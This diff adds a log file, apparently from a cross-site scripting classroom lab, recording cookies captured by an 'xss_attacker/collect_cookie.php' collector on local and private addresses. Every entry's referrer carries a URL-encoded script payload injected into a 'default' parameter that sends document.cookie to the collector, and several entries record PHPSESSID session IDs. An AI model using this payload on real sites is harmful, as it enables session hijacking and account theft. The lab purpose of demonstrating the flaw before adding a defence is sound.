@@ -1,0 +1,29 @@
+IP: 127.0.0.1 | PORT: 63233 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 | REF: http://127.0.0.1:8080/xss_user/vedekezes_elott/transaction.php?default=N%C3%A9met%3Cscript%20javascript:text%3Edocument.location=%22http://127.0.0.1:8080/xss_attacker/collect_cookie.php?c=%22%20+%20document.cookie;%3C/script%3E |  DATE: Saturday 13th 2021f March 2021 10:36:41 AM | COOKIE:  user_cookie=Tamás Miklós1519039256
+ 
+
+IP: 127.0.0.1 | PORT: 63251 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 | REF: http://127.0.0.1:8080/xss_user/vedekezes_elott/transaction.php?default=N%C3%A9met%3Cscript%20javascript:text%3Edocument.location=%22http://127.0.0.1:8080/xss_attacker/collect_cookie.php?c=%22%20+%20document.cookie;%3C/script%3E |  DATE: Saturday 13th 2021f March 2021 10:38:26 AM | COOKIE:  user_cookie=Tamás Miklós1519039256
+ 
+
+IP: 127.0.0.1 | 
+PORT: 51482 |  
+Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 | 
+REF: http://127.0.0.1:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%22http://127.0.0.1:8080/xss_attacker/collect_cookie.php?c=%22+document.cookie;%3C/script%3E |  
+DATE: Saturday 13th 2021f March 2021 06:03:55 PM | 
+COOKIE:  user_cookie=Minta Miklós1547552706
+ 
+
+IP: 192.168.0.105 | PORT: 61788 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 | REF: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%27http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c=%27+document.cookie;%3C/script%3E |  DATE: Friday 19th 2021f March 2021 10:56:52 AM | COOKIE:  user_cookie=Balogh Jutka706793393
+; PHPSESSID=uneqadukh38u5a4fai6vikdmc7 
+
+IP: 192.168.0.105 | PORT: 61840 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 | REF: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%27http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c=%27+document.cookie;%3C/script%3E |  DATE: Friday 19th 2021f March 2021 01:54:42 PM | COOKIE:  user_cookie=Balogh Jutka706793393
+; PHPSESSID=uneqadukh38u5a4fai6vikdmc7 
+
+IP: 192.168.0.105 | PORT: 61840 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 | REF: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%27http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c=%27+document.cookie;%3C/script%3E |  DATE: Friday 19th 2021f March 2021 01:54:44 PM | COOKIE:  user_cookie=Balogh Jutka706793393
+; PHPSESSID=uneqadukh38u5a4fai6vikdmc7 
+
+IP: 192.168.0.105 | PORT: 51687 |  Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 | REF: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%27http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c=%27+document.cookie;%3C/script%3E |  DATE: Friday 19th 2021f March 2021 02:49:02 PM | COOKIE:  user_cookie=Balogh Jutka566455543
+; PHPSESSID=1bue02ndcgo86pka2ija14n0m5 
+
+IP: 192.168.0.105 | PORT: 61184 |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 | REF: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol%3Cscript%3Edocument.location=%27http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c=%27+document.cookie;%3C/script%3E |  DATE: Friday 19th 2021f March 2021 09:38:18 PM | COOKIE:  user_cookie=Balogh Jutka706793393
+; PHPSESSID=uneqadukh38u5a4fai6vikdmc7 
+
